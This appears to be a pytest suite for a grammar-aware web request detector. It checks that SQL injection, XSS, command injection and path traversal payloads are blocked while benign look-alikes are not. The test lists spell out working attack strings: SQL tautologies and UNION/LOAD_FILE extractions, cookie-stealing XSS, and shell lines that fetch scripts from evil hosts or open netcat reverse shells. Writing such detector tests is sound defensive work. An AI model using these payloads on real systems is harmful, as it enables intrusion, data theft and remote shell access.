"""S2 grammar-aware analysis: detection, false-positive discipline, bounds."""

from __future__ import annotations

import logging

import pytest

from csf.extraction import extract
from csf.gateway import Decision, Stage
from csf.semantic.detector import (
    GRAMMARS_BY_LOCATION,
    S2Config,
    S2SemanticDetector,
    analyze_candidate,
    analyze_extraction,
)
from csf.semantic.shell import analyze_shell
from csf.semantic.sql import analyze_sql, dialect_coverage
from csf.semantic.traversal import analyze_traversal
from csf.semantic.xss import analyze_xss

logging.disable(logging.ERROR)  # sqlglot logs unsupported-syntax fallbacks

BLOCK = 4.0


def H(*pairs):
    return [(k.encode(), v.encode()) for k, v in pairs]


# -- SQL ------------------------------------------------------------------

SQL_ATTACKS = [
    "1' OR '1'='1", "x' UNION SELECT NULL,NULL-- ", "x'; DROP TABLE users-- ",
    "x'/**/OR/**/1=1-- ", "x' AND SLEEP(5)-- ", "admin'--", "admin'#",
    "') OR ('a'='a", "1' AND (SELECT COUNT(*) FROM users)>0-- ",
    "1 oR 1=1", "x'||(SELECT version())||'", "1'; EXEC xp_cmdshell('dir')-- ",
    "' OR ''='", "1' ORDER BY 10-- ", "1' UNION ALL SELECT @@version-- ",
    "x' UNION SELECT LOAD_FILE('/etc/passwd')-- ",
]

SQL_BENIGN = [
    "desk lamp", "O'Brien", "SELECT desk lamp", "user's guide", "don't",
    "C++ programming", "1 + 1 = 2", "price>100", "a & b", "part--123",
    "50% off", "foo(bar)", "drop table mountain", "order by date",
    "email@example.com", "/path/to/file", "100-200", "a*b", "x|y",
    "2026-10-06", "it's a test", "Smith & Sons (Ltd)", "comment -- here",
    "/* note */ ok", "SELECT * FROM docs", "1=1 in math class", "re: order",
]


@pytest.mark.parametrize("payload", SQL_ATTACKS)
def test_sql_attacks_are_detected(payload):
    assert analyze_sql(payload).score >= BLOCK, analyze_sql(payload).explain()


@pytest.mark.parametrize("value", SQL_BENIGN)
def test_sql_benign_does_not_reach_block(value):
    """FPR is the binding constraint. Weak markers may fire; nothing benign
    may reach the blocking threshold."""
    verdict = analyze_sql(value)
    assert verdict.score < BLOCK, f"{value!r} scored {verdict.score}: {verdict.explain()}"


def test_comment_obfuscation_is_equivalent_to_plain():
    """The parser consumes comments, so obfuscation cannot change the shape.
    This is the central claim of grammar-aware analysis."""
    plain = analyze_sql("1' OR '1'='1")
    obfuscated = analyze_sql("1'/**/OR/**/'1'='1")
    assert obfuscated.score >= plain.score * 0.8
    assert {f.marker for f in plain.findings} & {f.marker for f in obfuscated.findings}


def test_comment_truncation_needs_a_quoted_context():
    """In a quoted context reaching comment syntax requires escaping the
    quote, and that escape is the injection. In an unquoted numeric context
    no escape was needed, so `part--123` must stay benign."""
    assert analyze_sql("admin'--").score >= BLOCK
    assert analyze_sql("part--123").score < BLOCK


def test_numeric_context_requires_a_numeric_looking_value():
    """`*;q=0.3` from an Accept-Language header must not be read as a stacked
    statement in a numeric position — it accounted for 48 of ~70 S2 false
    positives on ECML benign traffic."""
    assert analyze_sql("*;q=0.3").score < BLOCK
    assert analyze_sql("elu-edt;q=0.5").score < BLOCK
    assert analyze_sql("1; DROP TABLE t").score >= BLOCK


def test_parse_failure_is_not_evidence():
    """Benign free text breaks SQL syntax constantly; treating that as an
    attack would be a large false-positive source."""
    assert analyze_sql("it's a 'weird\" value").score < BLOCK


def test_all_dialect_baselines_resolve():
    coverage = dialect_coverage()
    assert coverage["missing"] == []
    assert coverage["baselines_resolved"] == coverage["baselines_expected"]


# -- XSS ------------------------------------------------------------------

XSS_ATTACKS = [
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>", "javascript:alert(document.cookie)",
    '"><script>alert(1)</script>', "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>", "<ScRiPt>alert(1)</ScRiPt>",
    "java&#115;cript:alert(1)", "<details open ontoggle=alert(1)>",
    '" onmouseover=alert(1) x="', '<a href="javascript:alert(1)">c</a>',
    "<marquee onstart=alert(1)>",
]

XSS_BENIGN = [
    "desk lamp", "2 < 3 and 4 > 1", 'it\'s a "quote"', "a:b", "price: $5",
    "foo(bar)", "<3 this", "email@x.com", "C++ (modern)", "Tom & Jerry",
    "https://example.com/page?a=1", "time 10:30", "ratio 16:9", "if (a<b)",
]


@pytest.mark.parametrize("payload", XSS_ATTACKS)
def test_xss_attacks_are_detected(payload):
    assert analyze_xss(payload).score >= BLOCK, analyze_xss(payload).explain()


@pytest.mark.parametrize("value", XSS_BENIGN)
def test_xss_benign_does_not_reach_block(value):
    verdict = analyze_xss(value)
    assert verdict.score < BLOCK, f"{value!r} scored {verdict.score}: {verdict.explain()}"


def test_xss_case_and_entity_encoding_do_not_evade():
    assert analyze_xss("<ScRiPt>alert(1)</ScRiPt>").score >= BLOCK
    assert analyze_xss("java&#115;cript:alert(1)").score >= BLOCK


# -- shell ----------------------------------------------------------------

SHELL_ATTACKS = [
    ";cat /etc/passwd", "| whoami", "`id`", "$(uname -a)",
    "&& curl http://evil/x", "|| ping -c 10 127.0.0.1", "; rm -rf /tmp/x",
    "; nc -e /bin/sh host 4444", "x\ncat /etc/shadow", "; bash -i",
    "|| wget http://evil/s.sh", "$(curl evil.com)", "; env",
]

SHELL_BENIGN = [
    "desk lamp", "a;b in quotes", "my|favourite", "a & b design",
    "Tom & Jerry", "rock & roll", "a|b|c columns", "x > y", "if a<b",
    "cat and dog", "ls of items", "find my order", "host name",
    "service desk", "kill time", "report-2026.pdf", "user@host",
]


@pytest.mark.parametrize("payload", SHELL_ATTACKS)
def test_shell_attacks_are_detected(payload):
    assert analyze_shell(payload).score >= BLOCK, analyze_shell(payload).explain()


@pytest.mark.parametrize("value", SHELL_BENIGN)
def test_shell_benign_does_not_reach_block(value):
    """A bare shell operator in free text is common and benign. What makes it
    an attack is what FOLLOWS it."""
    verdict = analyze_shell(value)
    assert verdict.score < BLOCK, f"{value!r} scored {verdict.score}: {verdict.explain()}"


def test_shell_quoting_is_respected():
    """`"a;b"` is one argument; `a;b` is two commands. A regex cannot tell
    them apart, which is the entire false-positive problem for this class."""
    assert analyze_shell('"a;b"').score < BLOCK


# -- traversal ------------------------------------------------------------

TRAVERSAL_ATTACKS = [
    "../../../etc/passwd", "....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd", "%252e%252e%252fetc%252fpasswd",
    "/var/www/../../etc/shadow", "..\\..\\windows\\win.ini",
    "../../.ssh/id_rsa", "/etc/passwd", "../../../etc/passwd%00.png",
]

TRAVERSAL_BENIGN = [
    "file.txt", "path/to/resource", "a/../b", "report-2026.pdf",
    "docs/readme.md", "images/logo.png", "my.passwd.notes",
    "/public/index.html",
]


@pytest.mark.parametrize("payload", TRAVERSAL_ATTACKS)
def test_traversal_attacks_are_detected(payload):
    assert analyze_traversal(payload).score >= 3.0, analyze_traversal(payload).explain()


@pytest.mark.parametrize("value", TRAVERSAL_BENIGN)
def test_traversal_benign_is_clean(value):
    assert analyze_traversal(value).score < 3.0


def test_traversal_encodings_are_equivalent():
    """Normalisation, not pattern matching: every encoding of the same
    attack must resolve to the same conclusion."""
    scores = [analyze_traversal(p).score for p in
              ("../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd",
               "....//....//etc/passwd")]
    assert all(s >= 3.0 for s in scores)


def test_dot_segments_that_normalise_away_are_not_an_escape():
    assert analyze_traversal("a/../b").score < 3.0


# -- detector integration -------------------------------------------------


def test_location_restricts_which_grammars_run():
    """A User-Agent is not passed to a shell. Applying shell lexing to it
    produced a finding on 100% of benign CSIC requests."""
    user_agent = "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8"
    score_header, _, _ = analyze_candidate(user_agent, location="header")
    assert score_header == 0.0, "shell grammar must not apply to headers"
    assert "cmdi" not in GRAMMARS_BY_LOCATION["header"]
    assert "cmdi" in GRAMMARS_BY_LOCATION["query"]


def test_weak_findings_do_not_set_the_request_score():
    """Corroborating evidence must not masquerade as proof."""
    result = extract("GET", "/api/x", b"q=a+%26+b+design", H(("host", "h")), b"")
    signal = analyze_extraction(result, S2Config())
    assert signal.score < BLOCK


def test_request_score_is_max_not_sum():
    """Summing would let many weakly-scoring benign fields cross the
    threshold without any one of them being an attack."""
    many = "&".join(f"p{i}=a+%26+b" for i in range(20))
    result = extract("GET", "/api/x", many.encode(), H(("host", "h")), b"")
    signal = analyze_extraction(result, S2Config())
    assert signal.score < BLOCK


async def test_detector_blocks_injection_and_explains_itself():
    detector = S2SemanticDetector()
    result = extract("GET", "/api/items", b"id=1%27+OR+%271%27%3D%271",
                     H(("host", "h")), b"")
    verdict = await detector.evaluate(result)
    assert verdict.decision is Decision.BLOCK
    assert verdict.stage is Stage.SEMANTIC
    # An operator must be able to diagnose a block without reading source.
    assert "sqli" in verdict.reason
    assert "id" in verdict.reason
    assert any(w in verdict.reason for w in ("tautology", "OR", "comment"))


async def test_detector_allows_benign_request():
    detector = S2SemanticDetector()
    result = extract("POST", "/api/search", b"q=desk+lamp",
                     H(("host", "h"), ("content-type", "application/json"),
                       ("user-agent", "Mozilla/5.0 (compatible; Konqueror/3.5)")),
                     b'{"query":"O\'Brien & Sons","note":"50% off -- today"}')
    verdict = await detector.evaluate(result)
    assert verdict.decision is Decision.ALLOW


def test_numbers_and_bools_are_skipped():
    """Numeric, boolean and null leaves cannot carry injection structure.
    Path segments are candidates too, so count only the JSON body leaves."""
    result = extract("POST", "/", b"", H(("content-type", "application/json")),
                     b'{"n":123,"flag":true,"nil":null}')
    body_candidates = [c for c in result.candidates
                       if str(c.location) == "json_body"]
    assert len(body_candidates) == 3
    assert all(c.content_type in ("number", "bool", "null")
               for c in body_candidates)
    signal = analyze_extraction(result, S2Config())
    assert signal.candidates_parsed == 0


def test_candidate_cap_bounds_work():
    many = "&".join(f"p{i}=1%27+OR+%271%27%3D%271" for i in range(200))
    result = extract("GET", "/x", many.encode(), H(("host", "h")), b"")
    signal = analyze_extraction(result, S2Config(max_candidates=10))
    assert signal.candidates_examined <= 10


def test_oversized_values_are_skipped():
    """A 9 KB value must not be parsed across four grammars."""
    result = extract("GET", "/", f"q={'A'*9000}".encode(), H(("host", "h")), b"")
    signal = analyze_extraction(result, S2Config(max_value_length=1000))
    assert signal.candidates_parsed == 0


# -- performance characteristics ------------------------------------------


def test_cache_returns_identical_results():
    """The cache must not change any verdict — only how fast it is reached."""
    from csf.semantic.detector import clear_cache

    payloads = SQL_ATTACKS[:5] + SQL_BENIGN[:5] + XSS_ATTACKS[:3]
    clear_cache()
    cold = [analyze_candidate(p, location="query") for p in payloads]
    warm = [analyze_candidate(p, location="query") for p in payloads]
    assert cold == warm


def test_cache_is_keyed_on_grammar_set():
    """A value analysed as a header (no shell grammar) must not return the
    cached query-location result, which did include shell analysis."""
    from csf.semantic.detector import clear_cache

    clear_cache()
    user_agent = "Mozilla/5.0 (compatible; Konqueror/3.5; Linux)"
    as_query = analyze_candidate(user_agent, location="query")
    as_header = analyze_candidate(user_agent, location="header")
    assert as_header[0] == 0.0
    assert as_header != as_query or as_query[0] == 0.0


def test_cache_is_bounded():
    """An attacker sending unique values forever must not grow memory."""
    from csf.semantic.detector import _CACHE_SIZE, cache_info, clear_cache

    clear_cache()
    for i in range(_CACHE_SIZE + 500):
        analyze_candidate(f"value-{i}-'", location="query")
    assert cache_info().currsize <= _CACHE_SIZE


# -- coverage gaps closed after cross-corpus error analysis ----------------
#
# Every case below is a shape that was MISSED on an unseen application
# (ECML/PKDD) while the same class was detected on the development corpus.
# They are grouped together because they share a cause: each marker was
# written against the canonical spelling of an attack, and the corpus used to
# calibrate it happened to contain only that spelling.
#
# Each detection test is paired with the false-positive case that bounds it,
# because every one of these markers is a widening and a widening that is not
# bounded is how an analyser acquires a false-positive problem.

CSS_PAYLOADS = [
    # IE dynamic property: the CSS value is evaluated as script.
    '<div style="width: expression(document.location.replace(document.cookie));">',
    # XBL / -moz-binding: attaches a component that runs code.
    '<div style="binding: url(http://evil.example/x.swf);">',
    '<div style="-moz-binding: url(http://evil.example/x.xml#x);">',
    # HTC behaviour, both spellings seen in the wild.
    '<div style="behavior: url(http://evil.example/x.htc);">',
    '<div style="behaviour: url(http://evil.example/x.php);">',
    # An injected stylesheet is executable-class on its own.
    '<style type="text/javascript">alert(1)</style>',
]


@pytest.mark.parametrize("payload", CSS_PAYLOADS)
def test_css_execution_vectors_are_detected(payload):
    assert analyze_xss(payload).score >= BLOCK


@pytest.mark.parametrize("value", [
    # CSS-shaped text that opens no tag must stay inert. The analyser reads
    # CSS only inside a style attribute or a <style> element it saw injected;
    # a bare value is never treated as a stylesheet.
    "behaviour: polite",
    "background: url(/static/img/hero.png)",
    "width: 100%; expression of interest",
    "Comportamiento: url(/ayuda)",
])
def test_css_shaped_text_without_a_tag_is_inert(value):
    assert analyze_xss(value).score == 0.0


@pytest.mark.parametrize("payload", [
    # dynsrc/lowsrc are URL-bearing attributes; the scheme inside them was
    # never read, so these reached only the 3.0 injected-element marker.
    '<input type="image" dynsrc="javascript:alert(1)">',
    '<img lowsrc="javascript:alert(1)">',
    # Delimiter variants: browsers have not agreed on what ends a scheme.
    "<a href=\"javascript#[alert('x')]\">",
    '<a href="javascript&#58;alert(1)">',
])
def test_url_attribute_scheme_variants_are_detected(payload):
    assert analyze_xss(payload).score >= BLOCK


@pytest.mark.parametrize("value", [
    "https://cdn.example.com/lib.js",
    "/images/product-1.png",
    "mailto:ventas@example.com",
    "javascriptable",  # the token must be followed by a delimiter, not a letter
])
def test_benign_urls_are_not_script_schemes(value):
    assert analyze_xss(value).score == 0.0


@pytest.mark.parametrize("payload", [
    # The escape is identical to ' OR '1'='1; only the operator differs, and
    # the operator was the only thing the original marker looked at.
    "' OR 'ns' BETWEEN 'R' AND 'T",
    "' /**/ OR /**/ 'He' > 'S",
    "' OR '99he' < 'X",
    "' OR 'a' <> 'b",
    "' OR 'a' LIKE 'a",
])
def test_constant_predicates_in_any_operator_are_detected(payload):
    assert analyze_sql(payload).score >= BLOCK


def test_column_to_literal_comparison_is_not_a_constant_predicate():
    """The normal shape must not fire: WHERE c = 'x' is what a parameter IS.

    This is the bound on the marker. A predicate is only reported when it has
    no column reference at all, so the template's own comparison — and any
    benign value that merely lands in it — stays silent.
    """
    verdict = analyze_sql("Jabon liquido (2 litros)")
    assert all(f.marker != "constant_predicate" for f in verdict.findings)


@pytest.mark.parametrize("payload", [
    # No quote, no operator, no separator: the punctuation pre-filter rejected
    # these outright and the analyser never ran. A numeric parameter needs no
    # quote to escape -- the keyword is the escape.
    "1 UNION SELECT password FROM users",
    "1 UNION SELECT NULL,NULL",
    "5 union select user,password from mysql.user",
])
def test_keyword_only_injection_passes_the_prefilter(payload):
    assert analyze_sql(payload).score >= BLOCK


@pytest.mark.parametrize("value", [
    # Admitting keywords to the parser must not make ordinary prose an attack.
    "select a size", "update your profile", "insert coin",
    "order by date", "group tour from Mumbai", "copy of the receipt",
])
def test_sql_keywords_in_prose_stay_inert(value):
    assert analyze_sql(value).score == 0.0


@pytest.mark.parametrize("payload", [
    # Already escaped the way a JSON or JavaScript string literal would be, so
    # percent-decoding leaves it untouched and the dot segments stay hidden.
    r"\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/etc\/passwd.html",
    r"\.\.\/\.\.\/\.\.\/etc\/shadow",
])
def test_backslash_escaped_traversal_is_detected(payload):
    assert analyze_traversal(payload).score >= BLOCK


@pytest.mark.parametrize("payload", [
    # The separator was sent as bytes that are not valid UTF-8, so decoding
    # left only U+FFFD where the slash had been.
    "..\ufffd\ufffd..",
    "..\ufffd\ufffd..\ufffd\ufffd..\ufffd\ufffdfile.ext",
])
def test_undecodable_separator_is_read_as_a_separator(payload):
    assert analyze_traversal(payload).score >= BLOCK


@pytest.mark.parametrize("payload", [
    "file:///u:/to/omt/sb0lhocx.xml",
    "php://filter/convert.base64-encode/resource=index.php",
    "gopher://127.0.0.1:25/_MAIL",
    "dict://127.0.0.1:11211/stat",
    "expect://id",
])
def test_dangerous_schemes_are_detected(payload):
    assert analyze_traversal(payload).score >= BLOCK


@pytest.mark.parametrize("value", [
    "https://cdn.example.com/lib.js",
    "http://www.example.com/a/b.css",
    "mailto:x@example.com",
    "/catalogo/producto-2024.pdf",
])
def test_ordinary_schemes_and_paths_are_clean(value):
    assert analyze_traversal(value).score == 0.0


@pytest.mark.parametrize("payload", [
    # The break is a literal two-character escape, so no shell operator ever
    # appeared and the known command name was never corroborated.
    r"\n wget http://203.0.113.9:24327/nftp.exe",
    r"\nuftp -p host.example /some/path",
    r"\rxterm -display 203.0.113.9:0.0",
])
def test_escaped_line_break_before_a_command_is_detected(payload):
    assert analyze_shell(payload).score >= BLOCK


@pytest.mark.parametrize("value", [
    # A Windows path is full of accidental \n and \r sequences. Unescaping
    # alone cannot be the finding; a command invocation after the break is.
    r"C:\new\report.docx",
    r"C:\reports\new",
    r"C:\Users\n\notes.txt",
    r"path\no\network",
    r"\name",
    r"\r\n",
])
def test_escaped_breaks_in_paths_are_not_command_injection(value):
    assert analyze_shell(value).score == 0.0


def test_structural_keyword_prefilter_tracks_sqlglot():
    """Every clause keyword in the pre-filter must still be one sqlglot knows.

    The pre-filter decides whether the analyser runs at all, so an entry that
    drifts out of the parser's vocabulary silently stops admitting the payloads
    it was added for. Asserting it here turns an upstream rename into a test
    failure. ``_UNPARSED_KEYWORDS`` is exempt by construction and documented.
    """
    from sqlglot.parser import Parser
    from sqlglot.tokens import Tokenizer

    from csf.semantic.sql import _CLAUSE_KEYWORDS, _SET_OPERATIONS

    # sqlglot names its vocabulary in two places: the tokeniser's keyword table
    # and the set of token types that can open a statement. DECLARE is only in
    # the second. Both are the parser's own vocabulary, so both count.
    known = set(Tokenizer.KEYWORDS)
    known |= {str(t).split(".")[-1] for t in Parser.STATEMENT_PARSERS}
    unknown = [k for k in _CLAUSE_KEYWORDS + _SET_OPERATIONS if k not in known]
    assert not unknown, f"no longer sqlglot keywords: {unknown}"


def test_prefilter_does_not_admit_prose_on_a_partial_keyword():
    """'order'/'group' alone must not reach the parser; 'ORDER BY' must."""
    from csf.semantic.sql import _STRUCTURAL_KEYWORDS

    assert not _STRUCTURAL_KEYWORDS.search("order confirmation 2024")
    assert not _STRUCTURAL_KEYWORDS.search("group tour to Goa")
    assert _STRUCTURAL_KEYWORDS.search("1 order   by 10")


# -- Oracle coverage without an Oracle dialect ----------------------------
#
# `oracle` was added to DIALECTS, measured, and REMOVED: it changed no score
# anywhere -- not on either corpus, and not on the payloads below -- while
# costing 23-28% p50 latency. See ADR-0009.
#
# The reason it changed nothing is that sqlglot's mysql/postgres/tsql parsers
# already accept Oracle-flavoured syntax. That is a property of the library,
# not of CSF, so it is asserted here: if an upstream change tightens those
# parsers, this fails and the dialect decision gets revisited on evidence
# rather than silently leaving Oracle payloads undetected.

ORACLE_FLAVOURED = [
    "1' AND 1=UTL_INADDR.GET_HOST_NAME('attacker.example')--",
    "' UNION SELECT banner FROM v$version--",
    "' UNION SELECT table_name FROM all_tables--",
    "1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
    "' OR 1=1 AND ROWNUM=1--",
    "x'||(SELECT user FROM dual)||'",
    "1' AND EXISTS(SELECT 1 FROM dual)--",
    "'; BEGIN DBMS_LOCK.SLEEP(5); END;--",
    "' UNION SELECT NULL,UTL_HTTP.REQUEST('http://x/') FROM dual--",
    "1' AND (SELECT COUNT(*) FROM all_users)>0--",
]


@pytest.mark.parametrize("payload", ORACLE_FLAVOURED)
def test_oracle_payloads_are_caught_without_an_oracle_dialect(payload):
    assert analyze_sql(payload).score >= BLOCK


def test_dialect_set_is_the_measured_three():
    """Guards the ADR-0009 decision against a well-meaning re-addition.

    Adding a dialect is not free -- the second pass runs every context against
    every dialect -- so a change here must come with its own measurement.
    """
    from csf.semantic.sql import DIALECTS

    assert DIALECTS == ("mysql", "postgres", "tsql")


# -- cmdi coverage: the weak class (diagnosed on holdout, validated on val/ECML)
#
# Command injection was CSF's weakest class all project. S2's shell analyser
# missed three shapes; each is fixed below with the benign case that bounds it.
# Measured effect (cascade): holdout cmdi 56.7% -> 86.6%, VAL 72.1% -> 88.2%,
# ECML 70.7% -> 71.3%; S2/benign FPR unchanged on both corpora.

@pytest.mark.parametrize("payload", [
    # Operator + a Windows/Unix command S2 did not previously know.
    "| sleep 10", "& net view", "| systeminfo", "| net view", "; dir /s",
    "| tasklist", "&& ipconfig",
])
def test_cmdi_operator_plus_windows_command_blocks(payload):
    assert analyze_shell(payload).score >= BLOCK


@pytest.mark.parametrize("payload", [
    # Language-level code-execution sinks the POSIX lexer sees as one word.
    "system('pwd')", "exec('ls')", "phpinfo()", "system('sleep 5')",
    "passthru('id')", "shell_exec('whoami')", "eval('1')",
])
def test_cmdi_code_execution_sinks_block(payload):
    assert analyze_shell(payload).score >= BLOCK


@pytest.mark.parametrize("payload", [
    # The value IS a command invocation (no operator): command + flag/path.
    "nc -lvvp 4444 -e /bin/sh", "ls -l /tmp",
    "net localgroup Administrators hacker /ADD", "ping -c 1 10.0.0.1",
])
def test_cmdi_value_is_a_command_invocation_blocks(payload):
    assert analyze_shell(payload).score >= BLOCK


@pytest.mark.parametrize("value", [
    # The benign cases that bound the three rules above. A command word used as
    # ordinary English, with no operator and no flag/path, must NOT fire.
    "which product line", "net banking login", "type of account",
    "start date 2024", "find my order", "set the alarm", "dir of studies",
    "system of equations", "the exec summary", "ls",  # bare word
    "sleep well", "a description of the net income",
])
def test_cmdi_command_words_in_prose_stay_inert(value):
    assert analyze_shell(value).score == 0.0
